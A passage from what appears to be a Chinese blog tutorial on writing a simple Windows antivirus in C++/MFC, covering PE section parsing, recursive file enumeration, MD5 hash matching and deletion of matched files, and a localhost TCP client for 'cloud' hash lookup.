class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解析与输出"><a href="#解析与输出" class="headerlink" title="解析与输出"></a>解析与输出</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解析区段表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyQuDuanDlg::AnalyzeQuDuan</span><span class="params">(<span class="keyword">char</span>* buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buff;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buff);</span><br><span class="line">PIMAGE_FILE_HEADER FileHead  = (PIMAGE_FILE_HEADER)(&amp;pNtHead-&gt;FileHeader);</span><br><span class="line">PIMAGE_SECTION_HEADER pQuDuan = IMAGE_FIRST_SECTION(pNtHead);</span><br><span class="line">CString cs;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i&lt; FileHead-&gt;NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//区段名</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%S&quot;</span>, pQuDuan[i].Name);</span><br><span class="line">m_objQuDuanList.InsertItem(i, cs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//相对偏移</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%p&quot;</span>, pQuDuan[i].VirtualAddress);</span><br><span class="line">m_objQuDuanList.SetItemText(i,<span class="number">1</span>, cs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//区段大小</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%p&quot;</span>, pQuDuan[i].Misc);</span><br><span class="line">m_objQuDuanList.SetItemText(i,<span class="number">2</span>, cs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件偏移</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%p&quot;</span>, pQuDuan[i].PointerToRawData);</span><br><span class="line">m_objQuDuanList.SetItemText(i,<span class="number">3</span>, cs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//区段文件大小</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%p&quot;</span>, pQuDuan[i].SizeOfRawData);</span><br><span class="line">m_objQuDuanList.SetItemText(i,<span class="number">4</span>, cs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//标志</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%p&quot;</span>, pQuDuan[i].Characteristics);</span><br><span class="line">m_objQuDuanList.SetItemText(i,<span class="number">5</span>, cs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="查杀"><a href="#查杀" class="headerlink" title="查杀"></a>查杀</h1><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="启动MD5查杀"><a href="#启动MD5查杀" class="headerlink" title="启动MD5查杀"></a>启动MD5查杀</h3><p>#include &lt;openssl/md5.h&gt;<br>#pragma comment(lib,”res/libcrypto.lib”)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MD5按钮</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyAntivirusDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//m_strFilePath = L&quot;&quot;;</span></span><br><span class="line">UpdateData(TRUE);</span><br><span class="line"><span class="keyword">if</span> (m_strFilePath==<span class="string">L&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="string">L&quot;请先输入文件路径&quot;</span>,<span class="string">L&quot;提示！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_objOutList.DeleteAllItems();</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件属性</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = FindFirstFile(m_strFilePath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (!(fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))</span><br><span class="line">&#123;</span><br><span class="line">MD5_First();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//显示进度条</span></span><br><span class="line">m_objProcessT.ShowWindow(SW_SHOW);</span><br><span class="line">m_strTishiText.SetString(<span class="string">L&quot;查杀中...&quot;</span>);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">m_objTishiText.ShowWindow(SW_SHOW);</span><br><span class="line"><span class="comment">// 创建线程</span></span><br><span class="line">Thread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 线程的安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 默认栈的大小(局部变量、参数、返回地址)</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)MD5_CallBack,<span class="comment">// 线程代码的起始位置</span></span><br><span class="line"><span class="keyword">this</span>,<span class="comment">// 线程函数的参数，如果传递的是地址，那么需要保证这块内存地址的生命周期（不能是局部变量）</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 创建标志</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 传出的线程ID</span></span><br><span class="line"></span><br><span class="line">HANDLE ThreadT = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 线程的安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 默认栈的大小(局部变量、参数、返回地址)</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)Process,<span class="comment">// 线程代码的起始位置</span></span><br><span class="line"><span class="keyword">this</span>,<span class="comment">// 线程函数的参数，如果传递的是地址，那么需要保证这块内存地址的生命周期（不能是局部变量）</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 创建标志</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 传出的线程ID</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MD5—CallBack回调"><a href="#MD5—CallBack回调" class="headerlink" title="MD5—CallBack回调"></a>MD5—CallBack回调</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MD5计算回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">MD5_CallBack</span><span class="params">(LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyAntivirusDlg* pObj = (CMyAntivirusDlg*)lparam;</span><br><span class="line">pObj-&gt;GetFilePath(pObj-&gt;m_strFilePath);</span><br><span class="line">pObj-&gt;MD5_ANT(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取需要查杀的目录及文件"><a href="#获取需要查杀的目录及文件" class="headerlink" title="获取需要查杀的目录及文件"></a>获取需要查杀的目录及文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件遍历</span></span><br><span class="line"><span class="function">CString <span class="title">CMyAntivirusDlg::GetFilePath</span><span class="params">(CString FilePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString strTemp;</span><br><span class="line">CString strReturn = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 拼接完整路径</span></span><br><span class="line">CString fullPath = FilePath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = FindFirstFile(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line">GetFilePath(FilePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">CString csPath;<span class="comment">//保存路径到vector中</span></span><br><span class="line">csPath.Format(<span class="string">L&quot;%s\\%s&quot;</span>, FilePath, fileData.cFileName);</span><br><span class="line">vecPath.push_back(csPath);<span class="comment">//将路径加入vector</span></span><br><span class="line">m_objOutList.InsertItem(i, fileData.cFileName);</span><br><span class="line"></span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFile(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> strReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="验证MD5值"><a href="#验证MD5值" class="headerlink" title="验证MD5值"></a>验证MD5值</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MD5校验</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyAntivirusDlg::MD5_ANT</span><span class="params">(BOOL b = <span class="literal">true</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString cs;</span><br><span class="line"><span class="keyword">if</span> (vecPath.size() != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//打开存储在文件中的md5值</span></span><br><span class="line">HANDLE hFile = CreateFile(<span class="string">L&quot;res\\MD5.txt&quot;</span>, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//定义缓冲去</span></span><br><span class="line"><span class="keyword">char</span> md5[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="comment">//读取文件内容到缓冲区</span></span><br><span class="line">ReadFile(hFile, md5, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义缓冲区</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> hex[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vecPath.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line">m_objOutList.SetItemText(i,<span class="number">4</span>,vecPath[i]);</span><br><span class="line"><span class="comment">//计算md5值</span></span><br><span class="line"><span class="comment">//_bstr_t b(vecPath[i]);</span></span><br><span class="line">HANDLE hFilePath = CreateFile(vecPath[i], GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">DWORD FileSize=GetFileSize(hFilePath,<span class="literal">NULL</span>);</span><br><span class="line">DWORD dwReadPath;</span><br><span class="line"><span class="keyword">char</span>* md5Path = <span class="keyword">new</span> <span class="keyword">char</span>[FileSize];</span><br><span class="line">ReadFile(hFilePath, md5Path, FileSize, &amp;dwReadPath, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">md5_Value(md5Path, FileSize,hex);</span><br><span class="line"><span class="comment">//换算成大端16进制</span></span><br><span class="line">show_hex(<span class="string">&quot;md5: &quot;</span>, hex, <span class="number">16</span>);</span><br><span class="line">cs.Format(<span class="string">L&quot;%S&quot;</span>, md5);</span><br><span class="line">vecMd5.push_back(m_chex);</span><br><span class="line">m_objOutList.SetItemText(i,<span class="number">1</span>, m_chex);</span><br><span class="line"><span class="keyword">if</span>(b)<span class="comment">//如果是云查杀就不输出库MD5</span></span><br><span class="line">m_objOutList.SetItemText(i, <span class="number">2</span>, cs);</span><br><span class="line"><span class="comment">//比较文件MD5值是否相等</span></span><br><span class="line"><span class="keyword">if</span> (!(wcscmp(cs, m_chex)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b)</span><br><span class="line">m_objOutList.SetItemText(i, <span class="number">3</span>,<span class="string">L&quot;是&quot;</span>);</span><br><span class="line">BinDuFile.push_back(vecPath[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (b)</span><br><span class="line">m_objOutList.SetItemText(i, <span class="number">3</span>, <span class="string">L&quot;否&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(hex); i++)</span><br><span class="line">&#123;</span><br><span class="line">hex[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hFilePath);</span><br><span class="line"><span class="keyword">delete</span> md5Path;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="验证MD5所用的函数"><a href="#验证MD5所用的函数" class="headerlink" title="验证MD5所用的函数"></a>验证MD5所用的函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算md5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CMyAntivirusDlg::md5_Value</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* md5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 初始化保存 md5 信息的结构体</span></span><br><span class="line">MD5_CTX ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">MD5_Init(&amp;ctx);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将需要计算的数据传入到对应的结构中</span></span><br><span class="line">MD5_Update(&amp;ctx, data, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从结构中获取计算后的结果</span></span><br><span class="line">MD5_Final(md5, &amp;ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//转换为大端16进制</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyAntivirusDlg::show_hex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* n, <span class="keyword">unsigned</span> <span class="keyword">char</span>* hex, <span class="keyword">size_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString cs;</span><br><span class="line">m_chex = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cs.Format(<span class="string">L&quot;%2X&quot;</span>, hex[i]);</span><br><span class="line">m_chex += cs;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异常文件的删除"><a href="#异常文件的删除" class="headerlink" title="异常文件的删除"></a>异常文件的删除</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断MD5值结构异常的文件处理</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyAntivirusDlg::FileDelete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!(BinDuFile.size() == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BinDuFile.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//shDelFile.fFlags |= FOF_ALLOWUNDO; //删除到回收</span></span><br><span class="line">DeleteFile(BinDuFile[i]);</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(<span class="string">L&quot;删除成功&quot;</span>,<span class="string">L&quot;提示&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="string">L&quot;没有找到病毒文件&quot;</span>,<span class="string">L&quot;提示&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="云端查杀"><a href="#云端查杀" class="headerlink" title="云端查杀"></a>云端查杀</h2><h3 id="开启线程"><a href="#开启线程" class="headerlink" title="开启线程"></a>开启线程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//网络客户端回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Cilent</span><span class="params">(LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyAntivirusDlg* pObj = (CMyAntivirusDlg*)lparam;</span><br><span class="line">pObj-&gt;GetClienObj();<span class="comment">//调用</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用本地的文件遍历及MD5计算及启动客户端"><a href="#调用本地的文件遍历及MD5计算及启动客户端" class="headerlink" title="调用本地的文件遍历及MD5计算及启动客户端"></a>调用本地的文件遍历及MD5计算及启动客户端</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取网络客户端对象并调用客户端入口</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyAntivirusDlg::GetClienObj</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetFilePath(filePath);</span><br><span class="line">MD5_ANT(<span class="literal">false</span>);</span><br><span class="line">NetWorkClient obj;</span><br><span class="line"></span><br><span class="line">obj.NetWorkClientMain(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>包含所需的文件</p><p>#include &lt;WinSock2.h&gt;</p><p>#include &lt;ws2tcpip.h&gt;</p><p>#pragma comment(lib, “ws2_32.lib”)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::NetWorkClientMain</span><span class="params">(LPVOID obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyAntivirusDlg* pObj = (CMyAntivirusDlg*)obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">//SendMessage(UM_MYMESSAGE,1,2);</span></span><br><span class="line"><span class="comment">// 1. 初始化套接字模块，必须是网络程序中第一个调用的函数(搜索信号)</span></span><br><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个套接字，应该保存[IP:PORT](买一部手机)</span></span><br><span class="line"><span class="comment">//参数分别是使用的协议种类，数据传输方式以及协议类型</span></span><br><span class="line">SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 将套接字绑定到指定的 ip 地址和端口(安装手机卡)</span></span><br><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = connect(client, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字连接失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line">CString cs;</span><br><span class="line">pObj-&gt;m_objAccept.ShowWindow(SW_SHOW);</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;vecMd5.size();i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((i + <span class="number">1</span>) == vecMd5.size())</span><br><span class="line">&#123;</span><br><span class="line">send(client, <span class="string">&quot;T&quot;</span>, <span class="number">1</span>, <span class="number">0</span>);<span class="comment">//发送完成后发送T表示结束了</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">_bstr_t</span> <span class="title">b</span><span class="params">(vecMd5[i])</span></span>;</span><br><span class="line">send(client,b , <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line">recv(client, buff, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(buff, <span class="string">&quot;a&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">pObj-&gt;m_objOutList.SetItemText(i, <span 